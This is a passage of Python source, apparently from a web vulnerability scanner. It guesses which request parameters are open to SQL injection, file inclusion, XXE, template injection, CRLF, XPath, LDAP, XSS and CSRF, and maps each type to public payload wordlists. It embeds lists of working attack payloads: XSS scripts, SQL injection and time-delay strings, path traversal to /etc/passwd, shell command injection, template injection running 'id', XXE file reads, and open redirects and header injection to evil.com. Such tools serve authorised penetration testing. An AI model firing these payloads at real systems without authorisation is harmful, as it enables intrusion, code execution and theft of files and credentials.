        self.xxe_patterns = [
            # Explicit XML
            r'^xml$', r'^xmldata$', r'^xmlinput$', r'^xmlcontent$',
            r'.*xml$', r'.*_xml$', r'.*XML$',

            # SOAP/WSDL
            r'^soap$', r'^wsdl$', r'^envelope$', r'^message$',

            # Generic data (potrebbero essere XML)
            r'^data$', r'^input$', r'^payload$', r'^body$',
            r'^content$', r'^request$', r'^req$',

            # Config (spesso XML)
            r'^config$', r'^configuration$', r'^conf$', r'^cfg$',
            r'^settings$', r'^preferences$', r'^prefs$',

            # Feed/RSS (XML-based)
            r'^feed$', r'^rss$', r'^atom$', r'^sitemap$',

            # API/RPC
            r'^api$', r'^rpc$', r'^xmlrpc$', r'^method$',

            # Document formats (can be XML)
            r'^doc$', r'^document$', r'^svg$', r'^xsl$', r'^xslt$',
        ]

        # Patterns per SSTI
        self.ssti_patterns = [
            # Template files
            r'^template$', r'^tpl$', r'^tmpl$', r'^.*template$',
            r'^.*_template$', r'^.*Template$',

            # Rendering
            r'^render$', r'^view$', r'^layout$', r'^page$',
            r'^content$', r'^body$', r'^html$',

            # Template engines
            r'^engine$', r'^theme$', r'^skin$', r'^style$',
            r'^jinja$', r'^twig$', r'^blade$', r'^mustache$',
            r'^handlebars$', r'^velocity$', r'^freemarker$',

            # Output formatting (can use templates)
            r'^format$', r'^output$', r'^display$', r'^show$',
            r'^message$', r'^msg$', r'^text$', r'^data$',

            # Email templates
            r'^email$', r'^mail$', r'^subject$', r'^mailbody$',
            r'^email_template$', r'^mail_template$',

            # Expressions (direct eval context)
            r'^expr$', r'^expression$', r'^eval$', r'^code$',
            r'^snippet$', r'^fragment$',
        ]

        # Patterns per Open Redirect
        self.redirect_patterns = [
            r'^(url|uri|link|href)$',   # URL params
            r'^(redirect|redir|return|ret)$',  # redirect params
            r'^(next|continue|goto|to|dest|destination)$',  # navigation
            r'^(callback|success|error|back)$',  # callback URLs
            r'.*url$',                  # ends with 'url'
            r'.*_uri$',                 # ends with '_uri'
        ]

        # CRLF Injection patterns (HTTP Response Splitting)
        self.crlf_patterns = [
            # URL/Redirect parameters (CRLF comune qui)
            r'^url$', r'^uri$', r'^redirect$', r'^redir$',
            r'^location$', r'^goto$', r'^next$', r'^return$',
            r'^returnurl$', r'^returnUrl$', r'^backurl$',

            # Header manipulation
            r'^header$', r'^headers$', r'^.*header.*',
            r'^referer$', r'^referrer$', r'^origin$',

            # Email headers (CRLF in email injection)
            r'^to$', r'^from$', r'^cc$', r'^bcc$',
            r'^subject$', r'^message$', r'^body$',

            # Cookie manipulation
            r'^cookie$', r'^cookies$', r'^.*cookie.*',
            r'^session$', r'^sessionid$',

            # Generic output that might become headers
            r'^output$', r'^response$', r'^data$',
            r'^content$', r'^text$',
        ]

        # XPath Injection patterns
        self.xpath_patterns = [
            # XML/XPath parameters
            r'^xpath$', r'^query$', r'^xquery$', r'^xpathquery$',
            r'^xml$', r'^xmlquery$', r'^xmlsearch$',

            # Search in XML data
            r'^search$', r'^find$', r'^lookup$', r'^select$',
            r'^filter$', r'^where$', r'^criteria$',

            # User/Authentication (XPath in XML auth)
            r'^user$', r'^username$', r'^login$', r'^email$',
            r'^password$', r'^pass$', r'^pwd$',

            # Generic query/data
            r'^q$', r'^query$', r'^data$', r'^input$',
            r'^value$', r'^val$', r'^term$',
        ]

        # Patterns per LDAP Injection
        self.ldap_patterns = [
            r'^(username|user|uid|login)$',  # username params
            r'^(cn|dn|ou|dc)$',         # LDAP specific
            r'^(ldap|filter|search)$',  # LDAP search
            r'.*_dn$',                  # ends with '_dn'
        ]

        # XSS-prone parameter names (often reflected)
        self.xss_reflection_patterns = [
            # Search/Input
            r'^q$', r'^query$', r'^search$', r'^s$', r'^keyword$',
            r'^term$', r'^terms$', r'^find$',

            # User input
            r'^name$', r'^title$', r'^msg$', r'^message$',
            r'^comment$', r'^text$', r'^content$', r'^body$',
            r'^description$', r'^desc$', r'^bio$', r'^about$',

            # Reflection contexts
            r'^error$', r'^err$', r'^warning$', r'^info$',
            r'^callback$', r'^cb$', r'^jsonp$',
            r'^debug$', r'^trace$', r'^log$',

            # URL/Navigation
            r'^url$', r'^link$', r'^redirect$', r'^redir$',
            r'^next$', r'^return$', r'^returnurl$', r'^back$',

            # Generic input fields
            r'^input$', r'^value$', r'^val$', r'^data$',
            r'^param$', r'^parameter$', r'^arg$', r'^v$',
        ]

        # CSRF-sensitive actions (state-changing operations)
        self.csrf_action_patterns = [
            # Password/Account changes
            r'^password', r'^.*password.*', r'^pwd$', r'^newpwd$',
            r'^email$', r'^newemail$', r'^.*email.*change.*',

            # User management
            r'^delete', r'^.*delete.*', r'^remove', r'^.*remove.*',
            r'^update', r'^.*update.*', r'^edit', r'^.*edit.*',
            r'^create', r'^.*create.*', r'^add', r'^.*add.*',

            # Money/Payment
            r'^amount$', r'^transfer$', r'^payment$', r'^pay$',
            r'^withdraw$', r'^deposit$', r'^send$',

            # Permissions/Access
            r'^role$', r'^.*role.*', r'^permission', r'^.*permission.*',
            r'^admin$', r'^privilege', r'^access',

            # Actions
            r'^action$', r'^submit$', r'^confirm$', r'^execute$',
        ]

        # ===== COMPOUND PATTERNS (parametri con multiple parole) =====
        # Catturano parametri come "user_search_query", "product_id_list"

        # SQL Injection - compound patterns
        self.sql_compound_patterns = [
            r'.*search.*query', r'.*search.*term', r'.*search.*keyword',
            r'.*user.*id', r'.*product.*id', r'.*item.*id', r'.*order.*id',
            r'.*list.*id', r'.*ids$',  # multiple IDs
            r'.*filter.*', r'.*where.*', r'.*having.*',
            r'.*sort.*by', r'.*order.*by', r'.*group.*by',
        ]

        # LFI - compound patterns
        self.lfi_compound_patterns = [
            r'.*file.*path', r'.*file.*name', r'.*file.*location',
            r'.*upload.*file', r'.*download.*file', r'.*attach.*file',
            r'.*include.*file', r'.*require.*file',
            r'.*template.*file', r'.*config.*file',
            r'.*image.*path', r'.*media.*path', r'.*resource.*path',
        ]

        # XSS - compound patterns
        self.xss_compound_patterns = [
            r'.*search.*', r'.*query.*', r'.*keyword.*',
            r'.*name.*', r'.*title.*', r'.*message.*',
            r'.*comment.*', r'.*description.*',
            r'.*error.*message', r'.*success.*message',
            r'.*callback.*url', r'.*redirect.*url',
        ]

        # ===== TYPO e ABBREVIAZIONI comuni =====
        self.sql_typo_patterns = [
            # Typo comuni su 'user'
            r'^usr$', r'^usrname$', r'^usename$',

            # Typo su 'email'
            r'^emai$', r'^emial$', r'^e-mail$',

            # Typo su 'search'
            r'^seach$', r'^serch$', r'^srch$',

            # Typo su 'password'
            r'^pasword$', r'^passw$', r'^passwd$', r'^pswd$', r'^pass$',

            # Abbreviazioni comuni
            r'^uid$', r'^usr$', r'^pwd$', r'^psw$',
            r'^cat$', r'^pg$', r'^idx$', r'^cnt$',
            r'^num$', r'^no$', r'^nr$',
        ]

        self.lfi_typo_patterns = [
            # Typo su 'file'
            r'^fle$', r'^fil$', r'^filee$',

            # Typo su 'path'
            r'^paht$', r'^pth$', r'^pah$',

            # Typo su 'page'
            r'^pge$', r'^pag$', r'^pg$',

            # Typo su 'include'
            r'^includ$', r'^inc$', r'^incl$',

            # Typo su 'template'
            r'^templete$', r'^templ$', r'^tpl$', r'^tmpl$',
        ]

        # Compile all patterns for efficiency
        self._compiled_patterns = {
            'sqli': [re.compile(p, re.IGNORECASE) for p in self.sql_patterns],
            'sqli_compound': [re.compile(p, re.IGNORECASE) for p in self.sql_compound_patterns],
            'sqli_typo': [re.compile(p, re.IGNORECASE) for p in self.sql_typo_patterns],
            'lfi': [re.compile(p, re.IGNORECASE) for p in self.file_patterns],
            'lfi_compound': [re.compile(p, re.IGNORECASE) for p in self.lfi_compound_patterns],
            'lfi_typo': [re.compile(p, re.IGNORECASE) for p in self.lfi_typo_patterns],
            'rce': [re.compile(p, re.IGNORECASE) for p in self.cmd_patterns],
            'xxe': [re.compile(p, re.IGNORECASE) for p in self.xxe_patterns],
            'ssti': [re.compile(p, re.IGNORECASE) for p in self.ssti_patterns],
            'open_redirect': [re.compile(p, re.IGNORECASE) for p in self.redirect_patterns],
            'crlf': [re.compile(p, re.IGNORECASE) for p in self.crlf_patterns],
            'xpath': [re.compile(p, re.IGNORECASE) for p in self.xpath_patterns],
            'ldapi': [re.compile(p, re.IGNORECASE) for p in self.ldap_patterns],
            'xss_reflection': [re.compile(p, re.IGNORECASE) for p in self.xss_reflection_patterns],
            'xss_compound': [re.compile(p, re.IGNORECASE) for p in self.xss_compound_patterns],
            'csrf_action': [re.compile(p, re.IGNORECASE) for p in self.csrf_action_patterns],
        }

    def _matches_pattern(self, param_name: str, vuln_type: str) -> bool:
        """
        Check if parameter name matches any pattern for given vulnerability type.

        Uses parameter normalization for better matching:
        - userId, user_id, user-id → all match 'user' or 'id' patterns
        - oldPassword, old_password → match 'password' pattern
        """
        patterns = self._compiled_patterns.get(vuln_type, [])

        # Test original name
        for pattern in patterns:
            if pattern.match(param_name):
                return True

        # Test normalized variants
        variants = ParameterNormalizer.get_variants(param_name)
        for variant in variants:
            if variant == param_name:
                continue  # Already tested
            for pattern in patterns:
                if pattern.match(variant):
                    return True

        return False

    def analyze_parameter(self, param_name, param_value, response_text, content_type=""):
        """
        Analyze a parameter for vulnerability indicators.

        PRIORITÀ INTELLIGENTE:
        1. Se il valore è riflesso nella risposta → XSS ha priorità massima
        2. Pattern matching per identificare vulnerabilità specifiche
        3. FALLBACK: parametri sconosciuti testati con XSS + SQLi base
        """
        vulnerabilities = []
        param_name_lower = param_name.lower()
        param_value_str = str(param_value) if param_value else ""
        matched_any_pattern = False

        # ===== STEP 1: Check for reflection (PRIORITÀ XSS) =====
        has_reflection = False
        reflection_context = None

        # Empty string is falsy in Python, but add explicit len() check for clarity:
        # empty param values (common in form inputs) would match everywhere via `"" in text`
        if param_value_str and len(param_value_str) > 0 and response_text and param_value_str in response_text:
            reflection_context = self._get_reflection_context(param_value_str, response_text)
            if reflection_context:
                has_reflection = True
                matched_any_pattern = True
                # XSS con alta confidenza se c'è reflection in contesto HTML/attributo
                confidence = 90 if reflection_context in ['html', 'attribute'] else 70
                vulnerabilities.append({
                    'type': 'xss',
                    'confidence': confidence,
                    'context': reflection_context,
                    'evidence': f'Parameter value reflected in {reflection_context} context',
                    'priority': 1  # Massima priorità
                })

        # ===== STEP 2: SQL Injection - REGEX MATCHING =====
        sqli_matched = self._matches_pattern(param_name, 'sqli')
        sqli_compound = self._matches_pattern(param_name, 'sqli_compound')
        sqli_typo = self._matches_pattern(param_name, 'sqli_typo')

        if sqli_matched or sqli_compound or sqli_typo:
            matched_any_pattern = True
            # Typo e compound hanno confidence leggermente più bassa (più generici)
            if sqli_matched:
                confidence = 70
                context = 'database_parameter'
            elif sqli_typo:
                confidence = 62
                context = 'database_typo_parameter'
            else:  # compound
                confidence = 60
                context = 'database_compound_parameter'

            vulnerabilities.append({
                'type': 'sqli',
                'confidence': confidence,
                'context': context,
                'evidence': f'Parameter name matches SQL pattern: {param_name}',
                'priority': 2
            })

        # ===== STEP 3: File Inclusion (LFI) - REGEX MATCHING =====
        lfi_matched = self._matches_pattern(param_name, 'lfi')
        lfi_compound = self._matches_pattern(param_name, 'lfi_compound')
        lfi_typo = self._matches_pattern(param_name, 'lfi_typo')

        if lfi_matched or lfi_compound or lfi_typo:
            matched_any_pattern = True

            if lfi_matched:
                confidence = 70
                context = 'file_parameter'
            elif lfi_typo:
                confidence = 58
                context = 'file_typo_parameter'
            else:  # compound
                confidence = 55
                context = 'file_compound_parameter'

            # 'page' ha confidenza minore
            if param_name_lower == 'page':
                confidence = 50

            vulnerabilities.append({
                'type': 'lfi',
                'confidence': confidence,
                'context': context,
                'evidence': f'Parameter name matches file pattern: {param_name}',
                'priority': 2 if confidence >= 70 else 3
            })

        # ===== STEP 4: Command Injection (RCE) - REGEX MATCHING =====
        if self._matches_pattern(param_name, 'rce'):
            matched_any_pattern = True
            vulnerabilities.append({
                'type': 'rce',
                'confidence': 70,
                'context': 'command_parameter',
                'evidence': f'Parameter name matches command pattern: {param_name}',
                'priority': 2
            })

        # ===== STEP 5: XXE - REGEX MATCHING + Content-Type =====
        if self._matches_pattern(param_name, 'xxe') or 'xml' in content_type.lower():
            matched_any_pattern = True
            vulnerabilities.append({
                'type': 'xxe',
                'confidence': 60,
                'context': 'xml_parameter',
                'evidence': f'Parameter appears to accept XML data: {param_name}',
                'priority': 3
            })

        # ===== STEP 6: SSTI - REGEX MATCHING (solo senza reflection) =====
        if self._matches_pattern(param_name, 'ssti') and not has_reflection:
            matched_any_pattern = True
            vulnerabilities.append({
                'type': 'ssti',
                'confidence': 50,
                'context': 'template_parameter',
                'evidence': f'Parameter name matches template pattern: {param_name}',
                'priority': 3
            })

        # ===== STEP 7: Open Redirect - REGEX MATCHING =====
        if self._matches_pattern(param_name, 'open_redirect'):
            matched_any_pattern = True
            vulnerabilities.append({
                'type': 'open_redirect',
                'confidence': 60,
                'context': 'redirect_parameter',
                'evidence': f'Parameter name matches redirect pattern: {param_name}',
                'priority': 3
            })

        # ===== STEP 8: LDAP Injection - REGEX MATCHING =====
        if self._matches_pattern(param_name, 'ldapi'):
            matched_any_pattern = True
            vulnerabilities.append({
                'type': 'ldapi',
                'confidence': 40,
                'context': 'authentication_parameter',
                'evidence': f'Parameter name matches auth pattern: {param_name}',
                'priority': 4
            })

        # ===== STEP 8.5: CRLF Injection =====
        if self._matches_pattern(param_name, 'crlf'):
            matched_any_pattern = True
            # CRLF in URL params è più pericoloso (HTTP Response Splitting)
            is_url_param = any(p in param_name.lower() for p in ['url', 'redirect', 'location', 'goto'])
            confidence = 65 if is_url_param else 50

            vulnerabilities.append({
                'type': 'crlf',
                'confidence': confidence,
                'context': 'header_injection_vector' if is_url_param else 'potential_header_injection',
                'evidence': f'Parameter name matches CRLF injection pattern: {param_name}',
                'priority': 2 if is_url_param else 3
            })

        # ===== STEP 8.6: XPath Injection =====
        if self._matches_pattern(param_name, 'xpath'):
            matched_any_pattern = True
            # XPath in auth context è più critico
            is_auth_param = any(p in param_name.lower() for p in ['user', 'login', 'password', 'auth'])
            confidence = 60 if is_auth_param else 45

            vulnerabilities.append({
                'type': 'xpath',
                'confidence': confidence,
                'context': 'xml_authentication' if is_auth_param else 'xml_query',
                'evidence': f'Parameter name matches XPath injection pattern: {param_name}',
                'priority': 2 if is_auth_param else 3
            })

        # ===== STEP 9: CSRF (Cross-Site Request Forgery) =====
        # Rileva parametri che potrebbero essere vulnerabili a CSRF
        # Criteri: parametro senza CSRF token + azione state-changing
        if self._matches_pattern(param_name, 'csrf_action'):
            matched_any_pattern = True
            # Confidence dipende dal tipo di azione
            is_high_risk = any(p in param_name.lower() for p in ['password', 'delete', 'transfer', 'payment'])
            confidence = 70 if is_high_risk else 50

            vulnerabilities.append({
                'type': 'csrf',
                'confidence': confidence,
                'context': 'state_changing_action',
                'evidence': f'State-changing parameter without apparent CSRF protection: {param_name}',
                'priority': 2 if is_high_risk else 3
            })

        # ===== STEP 10: FALLBACK per parametri sconosciuti =====
        # Se nessun pattern ha matchato, testa comunque XSS con bassa confidenza
        # SQLi fallback SOLO se il nome parametro suggerisce uso database
        if not matched_any_pattern:
            # Check se il nome suggerisce reflection (XSS-prone)
            is_reflection_prone = self._matches_pattern(param_name, 'xss_reflection')
            is_xss_compound = self._matches_pattern(param_name, 'xss_compound')

            if is_reflection_prone or is_xss_compound:
                # Parametro che tipicamente riflette input → XSS con confidence media
                confidence = 55 if is_reflection_prone else 48  # Compound leggermente più basso
                vulnerabilities.append({
                    'type': 'xss',
                    'confidence': confidence,
                    'context': 'reflection_prone_parameter',
                    'evidence': f'Reflection-prone parameter name: {param_name}',
                    'priority': 2
                })
                matched_any_pattern = True
            else:
                # Parametro generico → XSS con bassa confidence
                vulnerabilities.append({
                    'type': 'xss',
                    'confidence': 40,
                    'context': 'unknown_parameter',
                    'evidence': f'Unknown parameter tested for XSS: {param_name}',
                    'priority': 3
                })

            # SQLi fallback - SOLO per parametri che sembrano database-related
            # Evita falsi positivi su parametri testuali come 'name', 'message', etc.
            sqli_hint_patterns = [
                r'.*id$', r'.*_id$', r'.*num.*', r'.*count.*', r'.*index.*',
                r'.*key.*', r'.*code.*', r'.*no$', r'.*number.*', r'.*pk.*',
                r'.*ref.*', r'.*row.*', r'.*seq.*', r'.*val.*', r'.*value.*'
            ]
            is_db_likely = any(re.match(p, param_name_lower) for p in sqli_hint_patterns)

            # Anche numeri nel valore suggeriscono uso database
            if param_value_str and param_value_str.isdigit():
                is_db_likely = True

            if is_db_likely:
                vulnerabilities.append({
                    'type': 'sqli',
                    'confidence': 30,  # Ridotta da 35
                    'context': 'unknown_parameter_db_hint',
                    'evidence': f'Unknown parameter with DB hints tested for SQLi: {param_name}',
                    'priority': 4
                })

        # Ordina per priorità (1 = massima)
        vulnerabilities.sort(key=lambda x: (x.get('priority', 5), -x.get('confidence', 0)))

        # Enrich con dati taxonomy (CWE, OWASP, severity)
        vulnerabilities = self._enrich_with_taxonomy(vulnerabilities)

        return vulnerabilities

    def analyze_parameter_context(self, param_name: str, all_param_names: list) -> dict:
        """
        Analizza il contesto del parametro basandosi sugli altri parametri presenti.

        Esempi:
        - Se vedi ['user', 'password'] insieme → authentication context → SQLi più probabile
        - Se vedi ['file', 'upload', 'type'] → file upload context → LFI possibile
        - Se vedi ['search', 'query', 'page'] → search context → XSS reflection probabile

        Returns:
            {
                'context': 'authentication' | 'search' | 'file_operation' | 'generic',
                'confidence_boost': int (0-20, da aggiungere alla confidence base)
            }
        """
        normalized_names = [ParameterNormalizer.normalize(p) for p in all_param_names]

        # Authentication context
        auth_indicators = ['user', 'username', 'password', 'pass', 'login', 'email']
        auth_count = sum(1 for ind in auth_indicators if any(ind in n for n in normalized_names))

        if auth_count >= 2:
            return {
                'context': 'authentication',
                'confidence_boost': 15,
                'reason': 'Multiple auth parameters detected'
            }

        # Search context
        search_indicators = ['search', 'query', 'keyword', 'q', 'find', 'term']
        search_count = sum(1 for ind in search_indicators if any(ind in n for n in normalized_names))

        if search_count >= 1:
            return {
                'context': 'search',
                'confidence_boost': 10,
                'reason': 'Search parameters detected'
            }

        # File operation context
        file_indicators = ['file', 'upload', 'download', 'path', 'filename', 'attach']
        file_count = sum(1 for ind in file_indicators if any(ind in n for n in normalized_names))

        if file_count >= 2:
            return {
                'context': 'file_operation',
                'confidence_boost': 12,
                'reason': 'File operation parameters detected'
            }

        # Database context
        db_indicators = ['id', 'table', 'column', 'where', 'sort', 'order', 'limit']
        db_count = sum(1 for ind in db_indicators if any(ind in n for n in normalized_names))

        if db_count >= 2:
            return {
                'context': 'database_query',
                'confidence_boost': 10,
                'reason': 'Database query parameters detected'
            }

        return {
            'context': 'generic',
            'confidence_boost': 0,
            'reason': 'No specific context detected'
        }

    def _enrich_with_taxonomy(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """
        Enrich vulnerability data with taxonomy information.

        Adds CWE IDs, OWASP categories, and severity scores from TaxonomyDatabase.
        """
        if not TAXONOMY_AVAILABLE:
            return vulnerabilities

        try:
            for vuln in vulnerabilities:
                vuln_type = vuln.get('type', '').lower()

                # Get CWE mapping
                for cwe_id, (mapped_type, name) in TaxonomyDatabase.CWE_MAPPING.items():
                    if vuln_type == mapped_type or vuln_type in mapped_type:
                        vuln['cwe_id'] = cwe_id
                        vuln['cwe_name'] = name
                        break

                # Get OWASP category
                for owasp_id, vuln_types in TaxonomyDatabase.OWASP_MAPPING.items():
                    if vuln_type in vuln_types or any(vuln_type in vt for vt in vuln_types):
                        vuln['owasp_category'] = owasp_id
                        break

                # Get severity score
                if vuln_type in TaxonomyDatabase.SEVERITY_SCORES:
                    vuln['cvss_base'] = TaxonomyDatabase.SEVERITY_SCORES[vuln_type]
                elif 'cvss_base' not in vuln:
                    vuln['cvss_base'] = 5.0  # Default medium

        except Exception as e:
            logger.debug(f"Taxonomy enrichment failed: {e}")

        return vulnerabilities

    def _get_reflection_context(self, value, html):
        """Determine the context where a value is reflected"""
        # Create patterns to check different contexts
        contexts = {
            'html': rf'>[^<]*{re.escape(value)}[^>]*<',
            'attribute': rf'=["\']?[^"\']*{re.escape(value)}[^"\']*["\']?[\s>]',
            'javascript': rf'<script[^>]*>[^<]*{re.escape(value)}[^<]*</script>',
            'css': rf'<style[^>]*>[^<]*{re.escape(value)}[^<]*</style>',
            'comment': rf'<!--[^>]*{re.escape(value)}[^>]*-->'
        }
        
        for context, pattern in contexts.items():
            if re.search(pattern, html, re.I | re.S):
                return context
        
        return None


class WordlistMapper:
    """Map vulnerabilities to appropriate wordlists"""

    # ========== INTERNAL FALLBACK PAYLOADS ==========
    # Usati quando i wordlist esterni non sono disponibili
    INTERNAL_PAYLOADS = {
        'xss': [
            # Payload semplici ed efficaci per XSS
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '"><script>alert(1)</script>',
            "'-alert(1)-'",
            '<img src=x onerror="alert(1)">',
            '<ScRiPt>alert(1)</sCrIpT>',
            '<IMG SRC="javascript:alert(1);">',
            '<a href="javascript:alert(1)">click</a>',
            '"><img src=x onerror=alert(1)>',
            "' onfocus=alert(1) autofocus='",
            '<input onfocus=alert(1) autofocus>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '{{constructor.constructor("alert(1)")()}}',  # Angular
            '${alert(1)}',  # Template literal
        ],
        'sqli': [
            # SQL Injection payloads
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "1' OR '1'='1",
            "admin'--",
            "1 OR 1=1",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "-1 UNION SELECT 1,2,3--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        ],
        'lfi': [
            # LFI payloads
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '/proc/self/environ',
            '....//....//....//windows/win.ini',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=/etc/passwd',
            'php://input',
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
        ],
        'rce': [
            # RCE payloads
            '; id',
            '| id',
            '`id`',
            '$(id)',
            '; whoami',
            '| whoami',
            '& whoami',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '; ping -c 3 127.0.0.1',
            '| ping -c 3 127.0.0.1',
            '; sleep 5',
            '| sleep 5',
            '& dir',
            '| type c:\\windows\\win.ini',
        ],
        'ssti': [
            # SSTI payloads
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '<%= 7*7 %>',
            '{{config}}',
            '{{self}}',
            '{{"".__class__}}',
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}",
            '{{request}}',
            '${request}',
        ],
        'xxe': [
            # XXE payloads
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        ],
        'ldapi': [
            # LDAP Injection
            '*',
            '*)(&',
            '*)(uid=*))(|(uid=*',
            'admin*',
            '*)(objectClass=*',
        ],
        'open_redirect': [
            # Open Redirect
            '//evil.com',
            'https://evil.com',
            '//evil.com/%2f..',
            '/\\evil.com',
            '////evil.com',
        ],
        'crlf': [
            '%0d%0aSet-Cookie:crlf=injected',
            '%0ASet-Cookie:test=crlf',
            '\\r\\nSet-Cookie:crlf=injected',
            '%0d%0aLocation:http://evil.com',
        ],
        'xpath': [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "test'",
            "' | //user/password | '",
        ],
    }

    def __init__(self, base_paths=None):
        self.base_paths = base_paths or {
            'fuzzdb': '/usr/share/wordlists/fuzzdb',
            'payloads': '/usr/share/wordlists/PayloadsAllTheThings',
            'seclists': '/usr/share/wordlists/SecLists'
        }

        # Intelligent recursive scanning
        self.use_intelligent_scan = True  # Feature flag
        self.intelligent_cache = {}  # Cache per file trovati

        # Vulnerability keywords per intelligent matching
        self.vuln_keywords = {
            'sqli': ['sql', 'sqli', 'injection', 'database', 'mysql', 'mssql', 'postgres', 'oracle', 'sqlite'],
            'xss': ['xss', 'cross-site', 'script', 'javascript', 'html'],
            'lfi': ['lfi', 'file-inclusion', 'path-traversal', 'directory-traversal', 'traversal'],
            'rfi': ['rfi', 'remote-file', 'remote-inclusion'],
            'rce': ['rce', 'command', 'cmd', 'exec', 'shell', 'code-execution', 'os-command'],
            'xxe': ['xxe', 'xml', 'external-entity'],
            'ssti': ['ssti', 'template', 'injection', 'jinja', 'twig', 'velocity'],
            'csrf': ['csrf', 'cross-site-request'],
            'crlf': ['crlf', 'http-response-splitting', 'header-injection'],
            'xpath': ['xpath', 'xml-injection'],
            'ldapi': ['ldap', 'ldapi', 'ldap-injection'],
            'open_redirect': ['redirect', 'open-redirect', 'url-redirect'],
            'file_upload': ['upload', 'file-upload', 'extension'],
            'idor': ['idor', 'insecure-direct-object'],
            'nosqli': ['nosql', 'mongodb', 'couchdb', 'cassandra'],
        }

        # Technology keywords
        self.tech_keywords = {
            'mysql': ['mysql', 'mariadb'],
            'mssql': ['mssql', 'sqlserver', 'tsql'],
            'postgresql': ['postgres', 'postgresql', 'pgsql'],
            'oracle': ['oracle', 'plsql'],
            'sqlite': ['sqlite'],
            'php': ['php'],
            'java': ['java', 'jsp', 'spring'],
            'python': ['python', 'django', 'flask'],
            'nodejs': ['node', 'nodejs', 'javascript', 'express'],
            'asp': ['asp', 'aspx', 'dotnet'],
            'ruby': ['ruby', 'rails'],
        }

        self.wordlist_map = {
            'xss': {
                'fuzzdb': [
                    'attack/xss/xss-rsnake.txt',
                    'attack/xss/xss-other.txt',
                    'attack/xss/XSSPolyglot.txt'
                ],
                'payloads': [
                    'XSS Injection/Intruders/JHADDIX_XSS.txt',
                    'XSS Injection/Intruders/XSS_Polyglots.txt',
                    'XSS Injection/Intruders/BRUTELOGIC-XSS-STRINGS.txt'
                ],
                'seclists': [
                    'Fuzzing/XSS/XSS-BruteLogic.txt',
                    'Fuzzing/XSS/XSS-Jhaddix.txt',
                    'Fuzzing/Polyglots/XSS-Polyglots.txt'
                ]
            },
            'sqli': {
                'fuzzdb': [
                    'attack/sql-injection/detect/Generic_SQLI.txt',
                    'attack/sql-injection/detect/MySQL.txt',
                    'attack/sql-injection/detect/MSSQL.txt'
                ],
                'payloads': [
                    'SQL Injection/Intruder/Generic_Fuzz.txt',
                    'SQL Injection/Intruder/SQLi_Polyglots.txt',
                    'SQL Injection/Intruder/Auth_Bypass.txt'
                ],
                'seclists': [
                    'Fuzzing/SQLi/Generic-SQLi.txt',
                    'Fuzzing/SQLi/quick-SQLi.txt',
                    'Fuzzing/Databases/MySQL.fuzzdb.txt'
                ]
            },
            'lfi': {
                'fuzzdb': [
                    'attack/lfi/JHADDIX_LFI.txt',
                    'attack/path-traversal/traversals-8-deep-exotic-encoding.txt'
                ],
                'payloads': [
                    'File Inclusion/Intruders/JHADDIX_LFI.txt',
                    'File Inclusion/Intruders/LFI-WindowsFileCheck.txt',
                    'Directory Traversal/Intruder/directory_traversal.txt'
                ],
                'seclists': [
                    'Fuzzing/LFI/LFI-Jhaddix.txt',
                    'Fuzzing/LFI/LFI-gracefulsecurity-linux.txt',
                    'Fuzzing/LFI/LFI-gracefulsecurity-windows.txt'
                ]
            },
            'rce': {
                'fuzzdb': [
                    'attack/os-cmd-execution/command-execution-unix.txt',
                    'attack/os-cmd-execution/Commands-Windows.txt'
                ],
                'payloads': [
                    'Command Injection/Intruder/command_exec.txt',
                    'Command Injection/README.md'
                ],
                'seclists': [
                    'Fuzzing/command-injection-commix.txt'
                ]
            },
            'xxe': {
                'fuzzdb': [
                    'attack/xml/xml-attacks.txt'
                ],
                'payloads': [
                    'XXE Injection/Files/Classic XXE.xml',
                    'XXE Injection/Intruders/XXE_Fuzzing.txt'
                ],
                'seclists': [
                    'Fuzzing/XXE-Fuzzing.txt'
                ]
            },
            'ssti': {
                'payloads': [
                    'Server Side Template Injection/Intruder/ssti.fuzz'
                ],
                'seclists': [
                    'Fuzzing/template-engines-special-vars.txt',
                    'Fuzzing/template-engines-expression.txt'
                ]
            },
            'file_upload': {
                'fuzzdb': [
                    'attack/file-upload/alt-extensions-php.txt',
                    'attack/file-upload/file-ul-filter-bypass-x-platform-php.txt'
                ],
                'payloads': [
                    'Upload Insecure Files/Extension PHP/',
                    'Upload Insecure Files/Picture Metadata/'
                ]
            },
            'open_redirect': {
                'payloads': [
                    'Open Redirect/Intruder/Open-Redirect-payloads.txt'
                ]
            },
            'ldapi': {
                'fuzzdb': [
                    'attack/ldap/ldap-injection.txt'
                ],
                'payloads': [
                    'LDAP Injection/Intruder/LDAP_FUZZ.txt'
                ],
                'seclists': [
                    'Fuzzing/LDAP.Fuzzing.txt'
                ]
            },
            # Extended vulnerability types
            'idor': {
                'seclists': [
                    'Fuzzing/ID-References.txt'
                ]
            },
            'path_traversal': {
                'fuzzdb': [
                    'attack/path-traversal/traversals-8-deep-exotic-encoding.txt'
                ],
                'seclists': [
                    'Fuzzing/LFI/LFI-gracefulsecurity-linux.txt'
                ]
            },
            'auth_bypass': {
                'seclists': [
                    'Fuzzing/Auth-Bypass.txt'
                ],
